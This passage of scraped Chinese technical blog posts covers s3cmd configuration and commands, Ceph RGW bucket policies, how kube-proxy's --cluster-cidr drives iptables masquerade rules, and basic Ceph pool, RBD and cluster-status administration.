xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\rEncryption password is used to protect your files from reading\rby unauthorized persons while in transfer to S3\rEncryption password: xxxxxxxxxx\rPath to GPG program [/usr/bin/gpg]:\rWhen using secure HTTPS protocol all communication with Amazon S3\rservers is protected from 3rd party eavesdropping. This method is\rslower than plain HTTP and can't be used if you're behind a proxy\rUse HTTPS protocol [No]: Yes\rNew settings:\rAccess Key: xxxxxxxxxxxxxxxxxxxxxx\rSecret Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\rEncryption password: xxxxxxxxxx\rPath to GPG program: /usr/bin/gpg\rUse HTTPS protocol: True\rHTTP Proxy server name:\rHTTP Proxy server port: 0\rTest access with supplied credentials? [Y/n] Y\rPlease wait, attempting to list all buckets...\rSuccess. Your access key and secret key worked fine :-)\rNow verifying that encryption works...\rSuccess. Encryption and decryption worked fine :-)\rSave settings? [y/N] y\rConfiguration saved to '/root/.s3cfg'\r最终生成的文件在目录 /root/.s3cfg 下\n通常需要关注的参数只有几个\n[default]\raccess_key = \u0026lt;ACCESS KEY FROM PORTAL\u0026gt;\rhost_base = s3-api.us-geo.objectstorage.softlayer.net\r# 这个要注意，在ceph中使用的是下面格式，表示列出的 host/bucket\rhost_bucket = s3-api.us-geo.objectstorage.softlayer.net/%(bucket)\rsecret_key = \u0026lt;SECRET KEY LISTED IN PORTAL\u0026gt;\rhttps://gist.github.com/greyhoundforty/a4a9d80a942d22a8a7bf838f7abbcab2\ns3cmd examples 说明 命令 列出 bucket 文件 s3cmd ls 创建存储桶 s3cmd mb s3://tecadmin 上传文件到 bucket s3cmd put file.txt s3://tecadmin/ 上传目录到 bucket s3cmd put -r backup s3://tecadmin/ 需要注意斜杠才表示目录 下载文件 s3cmd get s3://tecadmin/file.txt 从 bucket 删除文件 s3cmd del s3://tecadmin/file.txt 删除一个目录 s3cmd del s3://tastethelinux/Script 删除 bucket s3cmd rb s3://tastethelinux 拷贝 bucket 文件到另一个 bucket s3cmd cp s3://tastethelinux/tla.txt s3://tastethelinux-example 移动 bucket 文件到另一个 bucket s3cmd mv s3://tastethelinux/tla.txt s3://tastethelinux-example/tla_new.txt 查看存储使用量 s3cmd du s3://tastethelinux/ \u0026ndash;human-readable 获取 bucket 信息 s3cmd info s3://tastethelinux 继续上次中断的文件 s3cmd \u0026ndash;continue get s3://tastethelinux/tastethelinux.tar.gz 尝试运行但不上传 s3cmd \u0026ndash;dry-run 排除规则 —exclude / —include shell 风格通配符 s3cmd sync \u0026ndash;dry-run \u0026ndash;exclude \u0026lsquo;*.txt\u0026rsquo; 排除规则 —rexclude / —rinclude 正则表达式 s3cmd sync \u0026ndash;dry-run \u0026ndash;exclude \u0026lsquo;*.(txt|jpg)\u0026rsquo; 同步 s3cmd sync ./ s3://s3tools-demo/some/path/ 需要注意的是，s3cmd sync 首先检查 目的 已存在的文件的列表和详细信息，与==本地文件进行比较==，然后仅上传远程不存在或具有不同大小或 md5 校验和的文件。如果您运行了上述所有示例，您将从同步中获得与以下输出类似的输出：\n$ s3cmd sync ./ s3://s3tools-demo/some/path/\rdir2/file2-1.log -\u0026gt; s3://s3tools-demo/some/path/dir2/file2-1.log [1 of 2]\rdir2/file2-2.txt -\u0026gt; s3://s3tools-demo/some/path/dir2/file2-2.txt [2 of 2]\rReference [1] s3cmd Files\n","permalink":"https://www.oomkill.com/2023/09/05-3-s3cmd/","summary":"","title":"Ceph对象存储 - 使用s3cmd管理对象存储"},{"content":"CEPH RGW 支持 Bucket 的 S3 策略语言，但又不完全类似于 S3 的策略，因为 S3 中策略是基于 AWS 的，某些属性在 CEPH 中并不存在，下面就解开 RGW 关于桶策略的配置。\nBucket Policy (桶策略，下文中统称为 BP) 是对象存储中的管理权限和对象存储访问的机制。\nPolicy Language 的组成 BP 的格式采用了 JSON 语言，也就是 PL 是基于 JSON 的一种策略语言，他的格式主要为几个元素\n{\r\u0026quot;Version\u0026quot;: \u0026quot;2012-10-17\u0026quot;,\r\u0026quot;Statement\u0026quot;: [{\r\u0026quot;Effect\u0026quot;: ...,\r\u0026quot;Principal\u0026quot;: ...,\r\u0026quot;Action\u0026quot;: ...,\r\u0026quot;Resource\u0026quot;: ...\r}]\r}\r该结构由 ==一个== Version (表示当前版本) 和 ==一个或多个== Statement 数组组成，这些数组定义了希望应用的策略。每个语句数组中都有Effect, Principal, Action, Resource 和可选的 Condition 元素。\nEffect Effect 部分定义是一个动作，表示是否 Allow 或 Deny 指定资源的访问\n\u0026quot;Effect\u0026quot;:\u0026quot;Allow\u0026quot;\rPrincipal Principal 部分定义了策略应用的 “用户” 或 “实体” (entity) 或 “服务” 等，这里是按照 aws 中子源固定语法组成，当然在 CEPH 中不存在这些资源，那么相对的也是一种固定格式\nAWS 将用户分为了三类：\nAWS 账户 (AWS ACCOUNT) IAM 用户 (IAM USER) 匿名用户 (anonymous) 语法如下：\n\u0026quot;Principal\u0026quot;: {\r\u0026quot;AWS\u0026quot;: [\r\u0026quot;arn:aws:iam:::user/a0000000-000a-0000-0000-00d0ff0f0000\u0026quot;\r]\r}\rAWS Account 对于该类 “实体”，采用了下面的语法\n\u0026quot;AWS\u0026quot;:\u0026quot;account-ARN\u0026quot;\r示例\n\u0026quot;Principal\u0026quot;:{\u0026quot;AWS\u0026quot;:\u0026quot;arn:aws:iam::AccountIDWithoutHyphens:root\u0026quot;}\r或\n\u0026quot;Principal\u0026quot;:{\u0026quot;AWS\u0026quot;:[\u0026quot;arn:aws:iam::AccountID1WithoutHyphens:root\u0026quot;,\u0026quot;arn:aws:iam::AccountID2WithoutHyphens:root\u0026quot;]}\rIAM USER AWS IAM (AWS Identity and Access Management) ,是 AWS 中用户管理的一种方式，指定 “WHO”, “CAN ACCESS”, “WAHT” (AWS 中的服务和资源、集中管理精细权限)\n对于该类 “实体”，采用了下面的语法\n\u0026quot;Principal\u0026quot;:{\u0026quot;AWS\u0026quot;:\u0026quot;arn:aws:iam::account-number-without-hyphens:user/username\u0026quot;}\r匿名用户 匿名用户就是指对 ”每个人都授予的权限“，可以使用 通配符 (\u0026quot;*\u0026quot;) ，这类权限的配置对象是 ”存储桶中的所有对象均可公开访问“\n\u0026quot;Principal\u0026quot;:\u0026quot;*\u0026quot;\r或者\n\u0026quot;Principal\u0026quot;:{\u0026quot;AWS\u0026quot;:\u0026quot;*\u0026quot;}\r上面两类用户实际上权限分散的还是不一样，主要区别如下：\n\u0026quot;Principal\u0026quot;: \u0026quot;*\u0026quot; 并且 Effect: Allow 那么将允许任何人访问该资源。 如果 Effect: Allow 并且 \u0026quot;Principal\u0026quot; : { \u0026quot;AWS\u0026quot; : \u0026quot;*\u0026quot; }，允许 AWS 账户中的 IAM User, Root User.. 访问该资源（通常 不涉及到 CEPH） Action Action 部分定义了 ”对策略授予 (删除) 的权限”。这些操作包括 list bucket 等的功能；需要注意的是，这里 AWS S3 与 CEPH RGW 中定义的权限又不相同，对于 CEPH 中 Action 的权限集合，可以参考 [1]\nResource Action 部分定义了 “应用于对象存储资源” 例如存储桶和对象，这里的资源类型也是一种基于 aws 资源的固定格式，而在 CEPH 中不存在的部分直接为空，例如：\nBucket resources：\u0026quot;arn:aws:s3:::[bucket]\u0026quot; 应用所存储同种所有对象或部分对象：\u0026quot;arn:aws:s3:::[bucket]/[object]\u0026quot; 在上面的策略语言中，将 [bucket] 替换为存储桶的标签，将 [object] 替换为指定所有对象的通配符值 (*) 或对象的路径和名称。\n例如下面几个示例\n将策略应用到所有对象：\n\u0026quot;Resource\u0026quot;: [\r\u0026quot;arn:aws:s3:::example-bucket/*\u0026quot;\r]\r指定目录中的所有对象：\n\u0026quot;Resource\u0026quot;: [\r\u0026quot;arn:aws:s3:::example-bucket/folder/*\u0026quot;\r]\r特殊对象\n\u0026quot;Resource\u0026quot;: [\r\u0026quot;arn:aws:s3:::example-bucket/example-file.ext\u0026quot;\r]\r桶策略示例 允许任何人查看和下载 bucket 中的对象 {\r\u0026quot;Version\u0026quot;: \u0026quot;2012-10-17\u0026quot;,\r\u0026quot;Statement\u0026quot;: [{\r\u0026quot;Effect\u0026quot;: \u0026quot;Allow\u0026quot;,\r\u0026quot;Principal\u0026quot;: \u0026quot;*\u0026quot;,\r\u0026quot;Action\u0026quot;: [\r\u0026quot;s3:GetObject\u0026quot;,\r\u0026quot;s3:ListBucket\u0026quot;\r],\r\u0026quot;Resource\u0026quot;: [\r\u0026quot;arn:aws:s3:::bucket-example/*\u0026quot;\r]\r}]\r}\r授予指定帐户只能对指定目录的访问权限 {\r\u0026quot;Version\u0026quot;: \u0026quot;2012-10-17\u0026quot;,\r\u0026quot;Statement\u0026quot;: [\r{\r\u0026quot;Effect\u0026quot;: \u0026quot;Allow\u0026quot;,\r\u0026quot;Principal\u0026quot;: {\r\u0026quot;AWS\u0026quot;: \u0026quot;arn:aws:iam:::user/a0000000-000a-0000-0000-00d0ff0f0000\u0026quot;\r},\r\u0026quot;Action\u0026quot;: [\r\u0026quot;s3:ListBucket\u0026quot;\r],\r\u0026quot;Resource\u0026quot;: [\r\u0026quot;arn:aws:s3:::example-bucket\u0026quot;\r]\r},\r{\r\u0026quot;Effect\u0026quot;: \u0026quot;Allow\u0026quot;,\r\u0026quot;Principal\u0026quot;: {\r\u0026quot;AWS\u0026quot;: \u0026quot;arn:aws:iam:::user/a0000000-000a-0000-0000-00d0ff0f0000\u0026quot;\r},\r\u0026quot;Action\u0026quot;: [\r\u0026quot;s3:GetObject\u0026quot;\r],\r\u0026quot;Resource\u0026quot;: [\r\u0026quot;arn:aws:s3:::example-bucket/test/*\u0026quot;\r]\r}\r]\r}\r允许特定 IP 的访问 上面在 “策略语言” 中没有提到一个可选参数 “Condition”，这在 CEPH 中也是支持的，通过使用 “Condition” 您可以选择允许或拒绝来自指定 IP 地址或范围的流量。\n下面的示例仅允许来自指定 IP 地址的所有流量：\n{\r\u0026quot;Version\u0026quot;: \u0026quot;2012-10-17\u0026quot;,\r\u0026quot;Statement\u0026quot;: [\r{\r\u0026quot;Effect\u0026quot;: \u0026quot;Allow\u0026quot;,\r\u0026quot;Principal\u0026quot;: \u0026quot;*\u0026quot;,\r\u0026quot;Action\u0026quot;: \u0026quot;s3:*\u0026quot;,\r\u0026quot;Resource\u0026quot;: \u0026quot;arn:aws:s3:::example-bucket/*\u0026quot;,\r\u0026quot;Condition\u0026quot;: {\r\u0026quot;IpAddress\u0026quot;: {\r\u0026quot;aws:SourceIp\u0026quot;: \u0026quot;192.0.2.1/32\u0026quot;\r}\r}\r}\r]\r}\r目前 CEPH 支持的 Condition 字段的值为，参考与 [1]\naws:CurrentTime aws:EpochTime aws:PrincipalType aws:Referer aws:SecureTransport aws:SourceIp aws:UserAgent aws:username 应用桶策略 桶策略的应用只能通过 s3cmd 命令执行，radosgw-admin 命令并不可以应用，所以要想应用前，需要准备好对应的对象存储相关的配置\n语法\ns3cmd setpolicy [policy-file] s3://[bucket-label]\r例如，将文件 “policy.json” 中定义的策略应用到名为 “example-bucket” 的存储桶中\ns3cmd setpolicy policy.json s3://example-bucket\rReference [1] LIMITATIONS\n[2] Guides - Define Access and Permissions using Bucket Policies\n","permalink":"https://www.oomkill.com/2023/09/05-2-bucket-policy/","summary":"","title":"Ceph对象存储 - 桶策略 Bucket Policy"},{"content":"我们可以看到，kube-proxy 有一个 \u0026ndash;cluster-cidr 的参数，我们就来解开这个参数究竟有没有用\n$ kube-proxy -h|grep cidr --cluster-cidr string The CIDR range of pods in the cluster. When configured, traffic sent to a Service cluster IP from outside this range will be masqueraded and traffic sent from pods to an external LoadBalancer IP will be directed to the respective cluster IP instead 可以看到，参数说明是说，如果配置，那么从外部发往 Service Cluster IP 的流量将被伪装，从 Pod 发往外部 LB 将被直接发往对应的 cluster IP。但实际上做了什么并不知道，那么就从源码解决这个问题。\n首先我们知道，参数是作为 kube-proxy server 的参数，位于 cmd/kube-proxy 下，而对应的逻辑则位于 pkg/kube-proxy 下，参数很明显，就是 clusterCIDR，那么我们就寻找这个参数的调用即可。\n在 API KubeProxyConfiguration 中我们找到的对应的 ClusterCIDR ，在这里的注释又变为 ”用于桥接集群外部流量“。这里涉及到关于 kube-proxy 的两个模式 “LocalMode” 和 “ProxyMode“。\nLocalMode：表示是来自节点本地流量的模式，包含 ClusterCIDR, NodeCIDR ProxyMode：就是 kube-proxy 最常用的模式，包含 iptables, IPVS, user namespace, kernelspace 而参数 \u0026ndash;cluster-cidr 是作为选择使用的 “本地网络检测器” (Local Network Detector)，这里起到的作用就是 “将集群外部的流量伪装成 service VIP” ，从代码中我们可以看到 Detector 将决定了你使用的是什么网络，无论是 LocalMode 还是 ProxyMode。\n在代码 cmd/kube-proxy/app/server_others.go 中可以看到是如何选择的 LocalMode 方式，可以看出在存在三种模式：\n没有配置 \u0026ndash;cluster-cidr 则会返回一个 NoOpLocalDetector； 在配置了 \u0026ndash;cluster-cidr ，则将会使用 CIDR 的本地模式； 如果 \u0026ndash;cluster-cidr 没有配置，但配置了 LocalModeNodeCIDR，则会设置为 CNI 为该 Node 配置的 POD CIDR 的地址 (使用参数 \u0026ndash;proxy-mode 指定的模式，如果为空，那么会检测对应操作系统默认 Linux 为 iptables，如果内核开启 IPVS 那么则使用 IPVS，windows 默认为 kernelspace) func getLocalDetector(mode proxyconfigapi.LocalMode, config *proxyconfigapi.KubeProxyConfiguration, ipt utiliptables.Interface, nodeInfo *v1.Node) (proxyutiliptables.LocalTrafficDetector, error) { switch mode { case proxyconfigapi.LocalModeClusterCIDR: if len(strings.TrimSpace(config.ClusterCIDR)) == 0 { klog.Warning(\u0026quot;detect-local-mode set to ClusterCIDR, but no cluster CIDR defined\u0026quot;) break } return proxyutiliptables.NewDetectLocalByCIDR(config.ClusterCIDR, ipt) case proxyconfigapi.LocalModeNodeCIDR: if len(strings.TrimSpace(nodeInfo.Spec.PodCIDR)) == 0 { klog.Warning(\u0026quot;detect-local-mode set to NodeCIDR, but no PodCIDR defined at node\u0026quot;) break } return proxyutiliptables.NewDetectLocalByCIDR(nodeInfo.Spec.PodCIDR, ipt) } klog.V(0).Info(\u0026quot;detect-local-mode: \u0026quot;, string(mode), \u0026quot; , defaulting to no-op detect-local\u0026quot;) return proxyutiliptables.NewNoOpLocalDetector(), nil } 这里我们以 IPVS 为例，如果开启了 localDetector 在 这个 ipvs proxier 中做了什么? 在代码 pkg/proxy/ipvs/proxier.go 可以看到\nif !proxier.ipsetList[kubeClusterIPSet].isEmpty() { args = append(args[:0], \u0026quot;-A\u0026quot;, string(kubeServicesChain), \u0026quot;-m\u0026quot;, \u0026quot;comment\u0026quot;, \u0026quot;--comment\u0026quot;, proxier.ipsetList[kubeClusterIPSet].getComment(), \u0026quot;-m\u0026quot;, \u0026quot;set\u0026quot;, \u0026quot;--match-set\u0026quot;, proxier.ipsetList[kubeClusterIPSet].Name, ) if proxier.masqueradeAll { writeLine(proxier.natRules, append(args, \u0026quot;dst,dst\u0026quot;, \u0026quot;-j\u0026quot;, string(KubeMarkMasqChain))...) } else if proxier.localDetector.IsImplemented() { // This masquerades off-cluster traffic to a service VIP. The idea // is that you can establish a static route for your Service range, // routing to any node, and that node will bridge into the Service // for you. Since that might bounce off-node, we masquerade here. // If/when we support \u0026quot;Local\u0026quot; policy for VIPs, we should update this. writeLine(proxier.natRules, proxier.localDetector.JumpIfNotLocal(append(args, \u0026quot;dst,dst\u0026quot;), string(KubeMarkMasqChain))...) } else { // Masquerade all OUTPUT traffic coming from a service ip. // The kube dummy interface has all service VIPs assigned which // results in the service VIP being picked as the source IP to reach // a VIP. This leads to a connection from VIP:\u0026lt;random port\u0026gt; to // VIP:\u0026lt;service port\u0026gt;. // Always masquerading OUTPUT (node-originating) traffic with a VIP // source ip and service port destination fixes the outgoing connections. writeLine(proxier.natRules, append(args, \u0026quot;src,dst\u0026quot;, \u0026quot;-j\u0026quot;, string(KubeMarkMasqChain))...) } } 可以看到“不管使用了什么模式，都会更新一条 iptables 规则” 这就代表了使用了什么模式，而这个则被称之为 LocalTrafficDetector，也就是本地流量的检测，那我们看一下这个做了什么。\n在使用 IPVS 的日志中，可以看到这样一条规则，这个是来自集群外部的 IP 去访问集群 CLUSTER IP (KUBE-CLUSTER-IP，即集群内所有 service IP) 时, 将非集群 IP 地址，转换为集群内的 IP 地址 (做源地址转换)\n[DetectLocalByCIDR (10.244.0.0/16)] Jump Not Local: [-A KUBE-SERVICES -m comment --comment \u0026quot;Kubernetes service cluster ip + port for masquerade purpose\u0026quot; -m set --match-set KUBE-CLUSTER-IP dst,dst ! -s 10.244.0.0/16 -j KUBE-MARK-MASQ] 而这个步骤分布在所有模式下 (iptables\u0026amp;ipvs)，这里还是没说到两个概念 LocalMode 和 ProxyMode，实际上这两个模式的区别为：\nLocalMode：集群 IP 伪装采用 ClusterCIDR 还是 NodeCIDR，ClusterCIDR 是使用集群 Pod IP 的地址段 (IP Range)，而 LocalCIDR 只仅仅使用被分配给该 kubernetes node 上的 Pod 做地址伪装 ProxyMode：和 LocalMode 没有任何关系，是 kube-proxy 在运行时使用什么为集群 service 做代理，例如 iptables, ipvs ，而在这些模式下将采用什么 LocalMode 为集群外部地址作伪装，大概分为三种类型： 为来自集群外部地址 (cluster-off)：所有非 Pod 地址的请求执行跳转 (KUBE-POSTROUTING) 没有操作 ：在非 iptables/ipvs 模式下，不做伪装 masqueradeAll：为所有访问 cluster ip 的地址做伪装 ClusterCIDR 原理 kube-proxy 为 kube node 上生成一些 NAT 规则，如下所示\n-A KUBE-FIREWALL -j KUBE-MARK-DROP -A KUBE-LOAD-BALANCER -j KUBE-MARK-MASQ -A KUBE-MARK-MASQ -j MARK --set-xmark 0x4000/0x4000 -A KUBE-NODE-PORT -p tcp -m comment --comment \u0026quot;Kubernetes nodeport TCP port for masquerade purpose\u0026quot; -m set --match-set KUBE-NODE-PORT-TCP dst -j KUBE-MARK-MASQ -A KUBE-POSTROUTING -m comment --comment \u0026quot;Kubernetes endpoints dst ip:port, source ip for solving hairpin purpose\u0026quot; -m set --match-set KUBE-LOOP-BACK dst,dst,src -j MASQUERADE -A KUBE-POSTROUTING -m mark ! --mark 0x4000/0x4000 -j RETURN -A KUBE-POSTROUTING -j MARK --set-xmark 0x4000/0x0 -A KUBE-POSTROUTING -m comment --comment \u0026quot;kubernetes service traffic requiring SNAT\u0026quot; -j MASQUERADE -A KUBE-SERVICES ! -s 10.244.0.0/16 -m comment --comment \u0026quot;Kubernetes service cluster ip + port for masquerade purpose\u0026quot; -m set --match-set KUBE-CLUSTER-IP dst,dst -j KUBE-MARK-MASQ -A KUBE-SERVICES -m addrtype --dst-type LOCAL -j KUBE-NODE-PORT -A KUBE-SERVICES -m set --match-set KUBE-CLUSTER-IP dst,dst -j ACCEPT 可以看到这里做了几个链，在 KUBE-SERVICES 链中指明了非来自 ClusterCIDR 的 IP 都做一个，并且访问的目的地址是 KUBE-CLUSTER-IP (ipset 里配置的地址) 那么将跳转到 KUBE-MARK-MASQ 链做一个 --set-xmark 0x4000/0x4000 ，而在 KUBE-POSTROUTING 中对没有被标记 0x4000/0x4000 的操作不做处理\n具体来说，-A KUBE-NODE-PORT -p tcp -m comment --comment \u0026quot;Kubernetes nodeport TCP port for masquerade purpose\u0026quot; -m set --match-set KUBE-NODE-PORT-TCP dst -j KUBE-MARK-MASQ 做了如下操作：\n-A KUBE-SERVICES：将这条规则附加到名为KUBE-SERVICES的iptables链。 ! -s 10.244.0.0/16：排除源IP地址为10.244.0.0/16的流量（即来自Kubernetes服务集群IP的流量）。 -m comment --comment \u0026quot;Kubernetes service cluster ip + port for masquerade purpose\u0026quot;：添加一条注释，说明这个规则的用途。 -m set --match-set KUBE-CLUSTER-IP dst,dst：使用IP集合KUBE-CLUSTER-IP来匹配目标IP地址和目标端口。 -j KUBE-MARK-MASQ：如果流量匹配了前面的条件，将流量传递到名为KUBE-MARK-MASQ的目标。 iptables -j RETURN 是用于iptables规则中的一个目标动作，它不是用于拒绝或接受数据包的动作，而是用于从当前规则链中返回（返回到调用链）的动作。\n具体来说，当规则链中的数据包被标记为 RETURN 时，它们将不再受到当前链中后续规则的影响，而会立即返回到调用链，以便继续进行后续规则的处理。这通常用于某些高级设置，例如在自定义规则链中执行特定的操作后返回到主要的防火墙链。\n从代码中可以看到，对应执行 jump 的操作的链就是 KUBE-MARK-MASQ\n} else if proxier.localDetector.IsImplemented() { // This masquerades off-cluster traffic to a service VIP. The idea // is that you can establish a static route for your Service range, // routing to any node, and that node will bridge into the Service // for you. Since that might bounce off-node, we masquerade here. // If/when we support \u0026quot;Local\u0026quot; policy for VIPs, we should update this. writeLine(proxier.natRules, proxier.localDetector.JumpIfNotLocal(append(args, \u0026quot;dst,dst\u0026quot;), string(KubeMarkMasqChain))...)\t// KubeMarkMasqChain is the mark-for-masquerade chain KubeMarkMasqChain utiliptables.Chain = \u0026quot;KUBE-MARK-MASQ\u0026quot; // 具体拼接的就是 -j 链名的操作 func (d *detectLocalByCIDR) JumpIfNotLocal(args []string, toChain string) []string { line := append(args, \u0026quot;!\u0026quot;, \u0026quot;-s\u0026quot;, d.cidr, \u0026quot;-j\u0026quot;, toChain) klog.V(4).Info(\u0026quot;[DetectLocalByCIDR (\u0026quot;, d.cidr, \u0026quot;)]\u0026quot;, \u0026quot; Jump Not Local: \u0026quot;, line) return line } 继续往下 KUBE-POSTROUTING 可以看到对应伪装是一个动态的源地址改造，而 RETURN 则不是被标记的请求\nChain KUBE-POSTROUTING (1 references) target prot opt source destination MASQUERADE all -- 0.0.0.0/0 0.0.0.0/0 /* Kubernetes endpoints dst ip:port, source ip for solving hairpin purpose */ match-set KUBE-LOOP-BACK dst,dst,src RETURN all -- 0.0.0.0/0 0.0.0.0/0 mark match ! 0x4000/0x4000 MARK all -- 0.0.0.0/0 0.0.0.0/0 MARK xor 0x4000 MASQUERADE all -- 0.0.0.0/0 0.0.0.0/0 /* kubernetes service traffic requiring SNAT */ 这整体就是 ClusterCIDR 在 kube-proxy 中的应用，换句话说还需要关注一个 LocalCIDR\n","permalink":"https://www.oomkill.com/2023/09/ch26-kube-proxy-clustercidr/","summary":"","title":"kube-proxy参数ClusterCIDR做什么"},{"content":"测试上传/下载对象 存取故据时，客户端必须首先连接至RAD05集群上某存储地，而后根据对像名称由相关的中CRUSH规则完成数据对象寻址。于是为了测试集群的数据存储功能，首先创建一个用于测试的存储池mypool，并设定其PG数量为16个。\nceph osd pool create mypool 16 16 而后，即可将测试文件上传至存储池中。例如下面的rados put命令将/etc/hosts\nrados\nlspool 显示存储池\nrmpool 删除存储池\nmkpool 创建存储池\nrados mkpool mypool 32 32\nrados mkpool {name} {pgnum} {pgpnum} rados mkpool test 32 32 $ ceph osd pool create testpool 32 32 pool 'testpool' created 列出存储池\n$ ceph osd pool ls mypool rbdpool testpool $ rados lspools mypool rbdpool testpool 而后即可将测试文件上传到存储池中，例如将rados put命令将/etc/issue文件上传至testpool存储池，对象名称仍然较保留文件名issue，而rados ls可以列出指定存储池中的数据对象\nrados put issue /etc/issue --pool=testpool $ rados ls --pool=testpool # --pool 指定放入那个存储池中去 issue 而ceph osd map可查看获取到存储池中数据对象的具体位置信息（数据和元数据怎么映射存储的)\nceph osd map testpool issue $ ceph osd map mypool passwd osdmap e36 pool 'mypool' (1) object 'passwd' -\u0026gt; pg 1.27292a34 (1.14) -\u0026gt; up ([0,3,2], p0) acting ([0,3,2], p0) mypool存储池中的对象passwd被放在pg上1.27292a34 1为存储池编号.后面的编号可以理解为pg的位图。是pg的编号；up ([0,3,2], p0)正常可访问编号0、3、2，副本型存储池，crush算法计算得到，0为主osd。活动集acting ([0,3,2], p0)，此组pg(pg 1.27292a34 (1.14))之下所有的osd([0,3,2])都处于正常活动状态。\n删除数据对象 ceph osd pool rm testpool --yes-i-really-really-mean-it 删除存储池命令存在数据丢失的风险，Ceph于是默认禁止此类操作。管理员需要在ceph.conf配置文件中启用支持删除存储池的操作后，方可使用如下命令删除存储池。\nrados rm issue --pool=mypool ceph集群的访问接口 Ceph块设备接口 Ceph块设备，也称为RADOS块设备（简称RBD），是一种基于RADOS存储系统支持超配，（thin-provisioned）、可伸缩的条带化数据存储系统，它通过librbd库与OSD进行交互。RBD为KVM等虚拟化技术和云OS（如OpenStack和CloudStack）提供高可用和无限扩展性的存储后端，这些系统以来与libvirt和QEMU实用程序与RBD进行集。\n在集群部署完成以后，就具有了RBD接口，RBD接口关键是在客户端的配置。服务端本身可以直接使用。只需创建出存储池，在存储池中就可以创建块设备。块设备主要表现为存储池当中的镜像或映像文件（image）。\n客户端基于librbd库即可将RADOS存储集群用作块设备，不过，用于rbd的存储池需要实现启用rbd功能并进行初始化。例如，创建一个名为rbddata的存储池，在启动rbd功能后对其进行初始化\n对于rbdpool而言，创建完成后并不能直接使用，因为三种应用程序需要单独进行启用。相关存储池的应用才可以。\nceph osd pool create rbpool 64 ## 指明pg数量 # 默认情况下是裸池 $ ceph osd pool application enable rbdpool rbd enabled application 'rbd' on pool 'rbdpool' osd pool application enable \u0026lt;poolname\u0026gt; \u0026lt;app\u0026gt; {--yes-i-really-mean-it} enable use of an application \u0026lt;app\u0026gt; [cephfs,rbd,rgw] on pool \u0026lt;poolname\u0026gt; rbd pool init -p rbddata 不过，rbd存储池并不能直接用于块设备，而是需要事先在其中按需创建映像（image），以及可用映像、创建快照、将映像回滚到快照和查看快照等管理操作。\n创建名为img1的映像\nrbd create rbdpool/img --size 1G $ rbd ls -p rbdpool img img1 显示映像的相关信息，rbd info\n$ rbd info rbdpool/img rbd image 'img': size 1 GiB in 256 objects order 22 (4 MiB objects) id: 38bb6b8b4567 block_name_prefix: rbd_data.38bb6b8b4567 format: 2 features: layering, exclusive-lock, object-map, fast-diff, deep-flatten op_features: flags: create_timestamp: Fri Jun 14 17:08:48 2019 在客户端主机上，用户通过内核级的rbd驱动识别相关设备，即可对其进行分区、创建文件系统并挂载使用。\nRank 层级 MDS MDS在哪台服务器 上 Pool 两个存储池，存储池都位于同一个ceph集群之上，所以看到的空间大小是一样的。\n检查集群状态 命令：ceph-s\n输出信息：\n集群ID 集群运行状况 监视器地图版本号和监视器仲裁的状态 OSD map版本号和OSD的状态 归置组map版本 归置组和存储池数量 所存储数据理论上的数量和所存储对象的数量 所存储数据的总量 获取集群的即时状态 ceph pg stat ceph osd pool stat ceph df ceph df detail ceph df\n输出两端内容：GLOBAL和POOLS\nGLOBAL：存储量概览 POOLS：存储池列表和每个存储池的理论用量，但出不反应副本、克隆数据或快照 GLOBAL段\nsize 集群的整体存储容量 AVAIL 集群中可以使用的可用空间容量 RAW USED 已用的原始存储量 % RAW USED：已用的原始存储量百分比，将此数字与 full ratio和near full ratio搭配使用，可确保您不会用完集群的容量。 检查OSD和Mon的状态 可通过执行以下命令来检查OSD，以确保它们已启动里正在运行\nceph osd stat ceph osd dump 还可以根据OSD在CRUSH map中的位置查看OSD ceph osd tree Ceph将列显CRUSH树及主机它的OSD、OSD是否已启动及其权重 $ ceph osd tree ID CLASS WEIGHT TYPE NAME STATUS REWEIGHT PRI-AFF -1 0.09775 root default -3 0.03897 host stor01 0 hdd 0.01949 osd.0 up 1.00000 1.00000 7 hdd 0.01949 osd.7 up 1.00000 1.00000 -5 0.01959 host stor02 1 hdd 0.00980 osd.1 up 1.00000 1.00000 6 hdd 0.00980 osd.6 up 1.00000 1.00000 -7 0.01959 host stor03 2 hdd 0.00980 osd.2 up 1.00000 1.00000 5 hdd 0.00980 osd.5 up 1.00000 1.00000 -9 0.01959 host stor04 3 hdd 0.00980 osd.3 up 1.00000 1.00000 4 hdd 0.00980 osd.4 up 1.00000 1.00000 集群中存在多个Mon主机时，应该在启动集群之后读取或写入数据之前检查Mon的种裁状态：事实上，管理员也应该定期检查这种仲裁结果。\n显示监视器映射：ceph mon stat命令或者ceph mon dump $ ceph mon stat e3: 3 mons at {stor01=10.0.0.4:6789/0,stor02=10.0.0.5:6789/0,stor03=10.0.0.6:6789/0}, election epoch 20, leader 0 stor01, quorum 0,1,2 stor01,stor02,stor03 显示伸裁状态：ceph quorum status 使用管理套接字 每一个socket文件能够用来直接通过它管理对应的sock背后的守护进程。\nCeph的管理套接字接口常用于查询守护进程。\n套接字默认保存于/var/run/ceph目录 此接口的使用不能以远程方式进程 命令的使用格式\nceph --admin-daemon /var/run/ceph/{socket-name} 获取使用帮助：\nceph --admin-daemon /var/run/ceph/{socket-name} 停止或重启Ceph集群 停止 告知Ceph集群不要将osd标记为out，命令ceph osd set noout 按如下顺序停止守护进程和节点 存储客户端 网关，例如NFS Ganesha或对象网关 元数据服务器 Ceph OSD Ceph Manager Ceph Monitor 启动 以与停止过程相反的顺序启动节点 Ceph Monitor Ceph Manager Ceph OSD 元数据服务器 网关，例如NFS Ganesha或对象网关 存储客户端 删除noout标志，命令ceph osd unset noout Ceph的配置文件 配置文件结构 ceph配置文件使用ini语法格式 ceph在启动时会依次查找多个不同位置的配置文件，如后找的配置文件与前面发生冲突，会覆盖此前的配置信息 注释可通过\u0026quot;#\u0026quot;,\u0026quot;;\u0026quot; 配置文件主要有以下几个配置项所组成 [global]:全局配置,影响ceph存储集群中的所有守护进程 [osd]: 影响Ceph存储集群中的所有ceph-osd守护进程并覆盖全局中的相同设置 [mon]: 影响ceph存储集群中的所有ceph-mon守护进程并覆盖全局中的相同设置 [client]: 影响所有客户端，例如，挂载ceph块设备，ceph对象网关等 每一个独立的配置项是对所有选项生效的，如[mon]，如有需要对单独的选项进行配置可以使用[mon.id]加上id进行标识。\n您可以通过输入由.分隔的类型来指定守护程序的特定实例的配置，您可以指定该实例。 并通过实例ID\nceph osd守护进程的实例id总是数字，但它可能是ceph monitors的字母数字\n例如[mon.a]、[mon.b]、[mon.0]等 